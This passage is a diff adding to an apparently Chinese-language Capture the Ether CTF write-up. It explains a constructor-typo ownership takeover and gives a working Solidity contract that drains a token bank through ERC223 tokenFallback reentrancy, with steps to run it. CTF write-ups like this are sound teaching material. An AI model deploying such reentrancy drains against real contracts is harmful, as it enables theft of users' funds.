@@ -130,7 +130,39 @@ let tx1 = new EthereumTx(rawtx1, {chain: 'ropsten'})
 let tx2 = new EthereumTx(rawtx2, {chain: 'ropsten'})
 console.log(tx1.r.toString('hex') === tx2.r.toString('hex')) // true
 得到私钥后利用 owner 地址调用目标的 authenticate 方法
+## Assume ownership
+成为合约 owner
+构造函数 typo，直接调用 AssumeOwmershipChallenge 函数成为 owner
+## Token bank
+把 TokenBankChallenge 合约中的代币取光
+部署攻击合约
+contract TokenBankHacker is ITokenReceiver {
 
+    SimpleERC223Token token;
+    TokenBankChallenge bank;
+    address addr;
+    
+    function setParams(SimpleERC223Token _token, TokenBankChallenge _bank, address _addr) public {
+        token = _token;
+        bank = _bank;
+        addr = _addr;
+    }
+    
+    function withdraw(uint256 amount) public {
+        bank.withdraw(amount);
+    }
+    
+    function tokenFallback(address from, uint256 value, bytes data) external {
+        if (from == addr) {
+            token.transfer(address(bank), value, data);
+        } else if (token.balanceOf(address(this)) < 1000000000000000000000000) {
+            bank.withdraw(value);
+        }
+    }
+}
+从 bank 中 withdraw 到 player 地址
+从 player 地址给攻击合约转账
+通过攻击合约调用 bank.withdraw
 
 
 
